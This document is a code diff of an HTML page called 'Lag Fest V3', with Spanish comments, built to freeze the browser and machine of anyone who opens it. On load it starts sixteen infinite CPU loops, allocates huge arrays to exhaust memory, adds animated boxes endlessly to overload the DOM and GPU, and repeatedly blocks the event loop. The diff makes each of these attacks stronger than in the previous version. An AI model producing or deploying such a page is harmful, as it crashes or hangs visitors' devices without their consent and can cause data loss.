@@ -1,61 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔥 Lag Fest V2</title>
+  <title>Lag Fest V3 🔥</title>
   <style>
     body {
       background: black;
       color: white;
       font-family: monospace;
+      overflow: hidden;
     }
     .box {
       width: 100px;
       height: 100px;
       background-color: red;
-      margin: 2px;
-      float: left;
-      animation: spin 1s linear infinite;
+      position: absolute;
+      animation: spin 0.2s linear infinite;
     }
     @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
+      from { transform: rotate(0deg) scale(1); }
+      to { transform: rotate(360deg) scale(3); }
     }
   </style>
+</head>
+<body>
+  <h1>🔥 Invocando el lag... 🔥</h1>
   <script>
+    // CPU STRESS (hilos infinitos)
     function stressCPU() {
-      for (let i = 0; i < 8; i++) {
+      for (let i = 0; i < 16; i++) {
         setTimeout(() => {
           while (true) {
-            Math.sqrt(Math.random() * 999999);
+            let x = Math.pow(Math.random(), Math.random());
           }
-        }, 100);
+        }, 10);
       }
     }
 
+    // RAM STRESS (cadenas basura)
     function stressRAM() {
-      const garbage = [];
-      for (let i = 0; i < 10000; i++) {
-        let blob = new Array(1000000).fill("💣💥🔥");
-        garbage.push(blob);
+      let ramArray = [];
+      for (let i = 0; i < 5000; i++) {
+        ramArray.push(new Array(1000000).fill("🧠".repeat(100)));
       }
     }
 
-    function stressDOM() {
-      for (let i = 0; i < 10000; i++) {
-        let div = document.createElement("div");
-        div.className = "box";
-        document.body.appendChild(div);
-      }
+    // DOM & GPU STRESS (cajas animadas infinitas)
+    function stressDOMandGPU() {
+      setInterval(() => {
+        for (let i = 0; i < 500; i++) {
+          let div = document.createElement("div");
+          div.className = "box";
+          div.style.left = Math.random() * window.innerWidth + "px";
+          div.style.top = Math.random() * window.innerHeight + "px";
+          document.body.appendChild(div);
+        }
+      }, 300); // Repite y repite
     }
 
+    // EVENT LOOP BLOCKER
+    function blockEventLoop() {
+      setInterval(() => {
+        const end = Date.now() + 2000;
+        while (Date.now() < end) {
+          // Nada más que bloquear el event loop
+        }
+      }, 5000);
+    }
+
+    // INICIAR TODO
     window.onload = () => {
       stressCPU();
       setTimeout(stressRAM, 500);
-      setTimeout(stressDOM, 1000);
+      setTimeout(stressDOMandGPU, 1000);
+      setTimeout(blockEventLoop, 2000);
     };
   </script>
-</head>
-<body>
-  <h1>😈 Lag Fest V2 - ¡Prepárate!</h1>
 </body>
 </html>
